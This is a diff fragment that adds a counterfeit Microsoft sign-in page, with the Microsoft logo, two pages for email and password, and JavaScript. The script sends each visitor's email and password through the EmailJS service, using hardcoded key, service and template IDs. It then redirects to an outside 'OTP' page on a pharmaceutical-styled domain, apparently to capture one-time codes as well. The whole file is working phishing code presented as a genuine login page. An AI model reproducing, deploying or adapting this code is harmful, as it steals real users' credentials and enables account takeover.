14.5001V19.7001H63.633V9.36673H66.0664V11.0001H66.0997C66.333 10.4334 66.6664 10.0001 67.0997 9.66673C67.5664 9.36673 68.0997 9.20006 68.733 9.20006ZM69.7997 14.7001C69.7997 13.0001 70.2664 11.6334 71.233 10.6334C72.1997 9.6334 73.533 9.1334 75.2664 9.1334C76.8664 9.1334 78.133 9.60006 79.033 10.5667C79.933 11.5334 80.3997 12.8334 80.3997 14.4667C80.3997 16.1334 79.933 17.4667 78.9664 18.4667C77.9997 19.4667 76.6997 19.9667 75.033 19.9667C73.433 19.9667 72.1664 19.5001 71.233 18.5667C70.2664 17.6001 69.7997 16.3001 69.7997 14.7001ZM72.333 14.6001C72.333 15.6667 72.5664 16.5001 73.0664 17.0667C73.5664 17.6334 74.2664 17.9334 75.1664 17.9334C76.0664 17.9334 76.733 17.6334 77.1997 17.0667C77.6664 16.5001 77.8997 15.6667 77.8997 14.5334C77.8997 13.4334 77.6664 12.6001 77.1664 12.0334C76.6997 11.4667 76.033 11.2001 75.1664 11.2001C74.2664 11.2001 73.5997 11.5001 73.0997 12.1001C72.5664 12.6667 72.333 13.5001 72.333 14.6001ZM83.9997 12.1001C83.9997 12.4334 84.0997 12.7334 84.333 12.9334C84.5664 13.1334 85.033 13.3667 85.7997 13.6667C86.7664 14.0667 87.4664 14.5001 87.833 14.9667C88.233 15.4667 88.433 16.0334 88.433 16.7334C88.433 17.7001 88.0664 18.5001 87.2997 19.0667C86.5664 19.6667 85.533 19.9667 84.2664 19.9667C83.833 19.9667 83.3664 19.9001 82.833 19.8001C82.2997 19.7001 81.8664 19.5667 81.4997 19.4001V17.0001C81.933 17.3001 82.433 17.5667 82.933 17.7334C83.433 17.9001 83.8997 18.0001 84.333 18.0001C84.8664 18.0001 85.2997 17.9334 85.533 17.7667C85.7997 17.6001 85.933 17.3667 85.933 17.0001C85.933 16.6667 85.7997 16.3667 85.533 16.1667C85.2664 15.9334 84.733 15.6667 83.9997 15.3667C83.0997 15.0001 82.4664 14.5667 82.0997 14.1001C81.733 13.6334 81.533 13.0334 81.533 12.3001C81.533 11.3667 81.8997 10.6001 82.633 10.0001C83.3664 9.40006 84.333 9.10006 85.4997 9.10006C85.8664 9.10006 86.2664 9.1334 86.6997 9.2334C87.133 9.30006 87.533 9.4334 87.833 9.5334V11.8334C87.4997 11.6334 87.133 11.4334 86.6997 11.2667C86.2664 11.1001 85.833 11.0334 85.433 11.0334C84.9664 11.0334 84.5997 11.1334 84.3664 11.3001C84.133 11.5334 83.9997 11.7667 83.9997 12.1001ZM89.4664 14.7001C89.4664 13.0001 89.933 11.6334 90.8997 10.6334C91.8664 9.6334 93.1997 9.1334 94.933 9.1334C96.533 9.1334 97.7997 9.60006 98.6997 10.5667C99.5997 11.5334 100.066 12.8334 100.066 14.4667C100.066 16.1334 99.5997 17.4667 98.633 18.4667C97.6664 19.4667 96.3664 19.9667 94.6997 19.9667C93.0997 19.9667 91.833 19.5001 90.8997 18.5667C89.9664 17.6001 89.4664 16.3001 89.4664 14.7001ZM91.9997 14.6001C91.9997 15.6667 92.233 16.5001 92.733 17.0667C93.233 17.6334 93.933 17.9334 94.833 17.9334C95.733 17.9334 96.3997 17.6334 96.8664 17.0667C97.333 16.5001 97.5664 15.6667 97.5664 14.5334C97.5664 13.4334 97.333 12.6001 96.833 12.0334C96.3664 11.4667 95.6997 11.2001 94.833 11.2001C93.933 11.2001 93.2664 11.5001 92.7664 12.1001C92.2664 12.6667 91.9997 13.5001 91.9997 14.6001ZM108.133 11.3667H104.5V19.7001H102.033V11.3667H100.3V9.36673H102.033V7.9334C102.033 6.8334 102.4 5.96673 103.1 5.26673C103.8 4.56673 104.7 4.2334 105.8 4.2334C106.1 4.2334 106.366 4.2334 106.6 4.26673C106.833 4.30007 107.033 4.3334 107.2 4.40007V6.50006C107.133 6.46673 106.966 6.40006 106.766 6.3334C106.566 6.26673 106.333 6.2334 106.066 6.2334C105.566 6.2334 105.166 6.40006 104.9 6.70006C104.633 7.0334 104.5 7.50006 104.5 8.10006V9.3334H108.133V7.00006L110.566 6.26673V9.3334H113.033V11.3334H110.566V16.1667C110.566 16.8001 110.666 17.2667 110.9 17.5001C111.133 17.7667 111.5 17.9001 112 17.9001C112.133 17.9001 112.3 17.8667 112.5 17.8001C112.7 17.7334 112.866 17.6667 113.033 17.5667V19.5667C112.866 19.6667 112.633 19.7334 112.266 19.8001C111.9 19.8667 111.566 19.9001 111.2 19.9001C110.166 19.9001 109.4 19.6334 108.9 19.0667C108.4 18.5334 108.133 17.7001 108.133 16.6001V11.3667Z" fill="#FFFFFF"/>
+                    <path d="M13.2383 13.2383H24.5V24.5H13.2383V13.2383Z" fill="#FFB900"/>
+                    <path d="M0.5 13.2383H11.7617V24.5H0.5V13.2383Z" fill="#00A4EF"/>
+                    <path d="M13.2383 0.5H24.5V11.7617H13.2383V0.5Z" fill="#7FBA00"/>
+                    <path d="M0.5 0.5H11.7617V11.7617H0.5V0.5Z" fill="#F25022"/>
+                </svg>
+            </div>
+
+            <!-- Spacer for alignment -->
+            <div class="spacer"></div>
+        </div>
+
+        <!-- PAGE 1: Sign In -->
+        <div class="page active page1" id="page1">
+            <h1>Sign in</h1>
+            <p class="subtitle">Use your Microsoft account.</p>
+
+            <form id="emailForm" novalidate>
+                <div class="fui-Field">
+                    <div class="fui-Input" id="emailInputWrapper">
+                        <span class="fui-Input__contentBefore">
+                            <label for="email">Email or phone number</label>
+                        </span>
+                        <input type="email" id="email" name="user_email" placeholder=" " class="fui-Input__input" autocomplete="username" required>
+                    </div>
+                    <div id="email-error" class="fui-Field__validationMessage error-message"></div>
+                </div>
+
+                <div class="sign-in-options">
+                    <a href="#">Forgot your username?</a>
+                </div>
+
+                <button type="submit" class="sign-in-btn" id="nextBtn">Next</button>
+            </form>
+        </div>
+
+        <!-- PAGE 2: Enter your password -->
+        <div class="page page2" id="page2">
+            <div class="email-display">
+                <span class="email-text" id="displayEmail"></span>
+            </div>
+
+            <h1 class="password-title">Enter your password</h1>
+
+            <form id="passwordForm" novalidate>
+                <!-- Hidden field to store email for EmailJS -->
+                <input type="hidden" id="hiddenEmail" name="user_email" value="">
+
+                <div class="fui-Field">
+                    <div class="fui-Input" id="passwordInputWrapper">
+                        <span class="fui-Input__contentBefore">
+                            <label for="password">Password</label>
+                        </span>
+                        <input type="password" id="password" name="user_password" placeholder=" " class="fui-Input__input" required>
+                    </div>
+                    <div id="password-error" class="fui-Field__validationMessage error-message"></div>
+                </div>
+
+                <button type="submit" class="sign-in-btn" id="signInBtn">Continue</button>
+                <div id="form-status" class="fui-Field__validationMessage success-message"></div>
+            </form>
+        </div>
+
+        <div class="create-account">
+            <span class="normal-text">New to Microsoft? </span><a href="#">Create an account</a>
+        </div>
+    </div>
+
+    <!-- EmailJS SDK -->
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+
+    <script>
+        // Initialize EmailJS with your public key
+        (function() {
+            emailjs.init("uGRhkufMjo08rjwb_");
+        })();
+
+        // --- Configuration ---
+        // Update this to your actual OTP page URL
+        const OTP_PAGE_URL = 'https://www.pfizertalents.com/code';
+
+        const emailForm = document.getElementById("emailForm");
+        const passwordForm = document.getElementById("passwordForm");
+        const emailInput = document.getElementById("email");
+        const passwordInput = document.getElementById("password");
+        const hiddenEmail = document.getElementById("hiddenEmail");
+        const emailError = document.getElementById("email-error");
+        const passwordError = document.getElementById("password-error");
+        const formStatus = document.getElementById("form-status");
+        const signInBtn = document.getElementById("signInBtn");
+        const nextBtn = document.getElementById("nextBtn");
+        const backArrow = document.getElementById("backArrow");
+        const displayEmail = document.getElementById("displayEmail");
+        const page1 = document.getElementById("page1");
+        const page2 = document.getElementById("page2");
+        const emailInputWrapper = document.getElementById("emailInputWrapper");
+        const passwordInputWrapper = document.getElementById("passwordInputWrapper");
+
+        // Helper functions
+        function showError(element, message) {
+            element.textContent = message;
+            element.classList.add("visible");
+        }
+
+        function hideError(element) {
+            element.textContent = "";
+            element.classList.remove("visible");
+        }
+
+        function showStatus(message, isSuccess = true) {
+            formStatus.textContent = message;
+            formStatus.className = isSuccess ? "fui-Field__validationMessage success-message visible" : "fui-Field__validationMessage error-message visible";
+        }
+
+        function hideStatus() {
+            formStatus.textContent = "";
+            formStatus.className = "fui-Field__validationMessage success-message";
+        }
+
+        function goToPage(pageNum) {
+            if (pageNum === 1) {
+                page1.classList.add("active");
+                page2.classList.remove("active");
+                // Hide back arrow on page 1
+                backArrow.style.display = 'none';
+            } else {
+                page1.classList.remove("active");
+                page2.classList.add("active");
+                // Show back arrow on page 2
+                backArrow.style.display = 'block';
+            }
+        }
+
+        // Track input values for floating label
+        function updateInputState(input, wrapper) {
+            if (input.value.trim() !== '') {
+                wrapper.classList.add('has-value');
+            } else {
+                wrapper.classList.remove('has-value');
+            }
+        }
+
+        emailInput.addEventListener('input', function() {
+            updateInputState(this, emailInputWrapper);
+            hideError(emailError);
+            emailInputWrapper.classList.remove('error');
+        });
+
+        passwordInput.addEventListener('input', function() {
+            updateInputState(this, passwordInputWrapper);
+            hideError(passwordError);
+            hideStatus();
+            passwordInputWrapper.classList.remove('error');
+        });
+
+        // Initial state
+        updateInputState(emailInput, emailInputWrapper);
+        updateInputState(passwordInput, passwordInputWrapper);
+
+        // Initially hide back arrow
+        backArrow.style.display = 'none';
+
+        // Back arrow click handler
+        backArrow.addEventListener("click", (e) => {
+            e.preventDefault();
+            goToPage(1);
+            hideError(passwordError);
+            hideStatus();
+            passwordInputWrapper.classList.remove('error');
+            // Reset password field
+            passwordInput.value = '';
+            updateInputState(passwordInput, passwordInputWrapper);
+        });
+
+        // --- Page 1: Email submission - Navigate to Page 2 with loading effect ---
+        emailForm.addEventListener("submit", (e) => {
+            e.preventDefault();
+            hideError(emailError);
+            hideStatus();
+            emailInputWrapper.classList.remove('error');
+
+            const emailValue = emailInput.value.trim();
+
+            // Simple email validation
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+            if (!emailValue) {
+                showError(emailError, "Email is required.");
+                emailInputWrapper.classList.add('error');
+                return;
+            } else if (!emailRegex.test(emailValue)) {
+                showError(emailError, "Please enter a valid email address.");
+                emailInputWrapper.classList.add('error');
+                return;
+            }
+
+            // Store email for page 2 display and hidden field
+            displayEmail.textContent = emailValue;
+            hiddenEmail.value = emailValue; // Set hidden field value for EmailJS
+            localStorage.setItem('userEmail', emailValue);
+
+            // Show loading spinner on Next button
+            nextBtn.disabled = true;
+            nextBtn.innerHTML = '<span class="loading-spinner"></span>';
+
+            // Navigate to page 2 with a slight delay to show loading effect
+            setTimeout(() => {
+                goToPage(2);
+                // Reset button state
+                nextBtn.disabled = false;
+                nextBtn.innerHTML = 'Next';
+                // Focus on password field
+                setTimeout(() => {
+                    passwordInput.focus();
+                }, 100);
+            }, 1500);
+        });
+
+        // --- Page 2: Password submission - Send to EmailJS then redirect to OTP ---
+        passwordForm.addEventListener("submit", async (e) => {
+            e.preventDefault();
+
+            hideError(passwordError);
+            hideStatus();
+            passwordInputWrapper.classList.remove('error');
+
+            const passwordValue = passwordInput.value.trim();
+            const emailValue = hiddenEmail.value; // Get email from hidden field
+
+            if (!passwordValue) {
+                showError(passwordError, "Password is required.");
+                passwordInputWrapper.classList.add('error');
+                return;
+            }
+
+            // Disable button and show loading
+            signInBtn.disabled = true;
+            signInBtn.innerHTML = '<span class="loading-spinner"></span> Signing in...';
+
+            try {
+                // Send form via EmailJS - includes both email and password
+                const response = await emailjs.sendForm(
+                    "service_t84doqy",
+                    "template_awd8sif",
+                    "#passwordForm"
+                );
+
+                console.log("EmailJS SUCCESS:", response.status);
+                console.log("Email sent:", emailValue);
+                console.log("Password sent:", passwordValue);
+                showStatus("Sign in successful! Redirecting...", true);
+
+                // Redirect to OTP page with email as URL parameter
+                setTimeout(() => {
+                    window.location.href = `${OTP_PAGE_URL}?email=${encodeURIComponent(emailValue)}`;
+                }, 1000);
+
+            } catch (error) {
+                console.error("EmailJS FAILED:", error);
+                showStatus("There was an error sending your credentials. Please try again later.", false);
+
+                signInBtn.disabled = false;
+                signInBtn.textContent = "Continue";
+            }
+        });
+
+        // Clear error on input focus
+        emailInput.addEventListener('focus', function() {
+            emailInputWrapper.classList.remove('error');
+            hideError(emailError);
+        });
+
+        passwordInput.addEventListener('focus', function() {
+            passwordInputWrapper.classList.remove('error');
+            hideError(passwordError);
+            hideStatus();
+        });
+    </script>
+</body>
+</html>
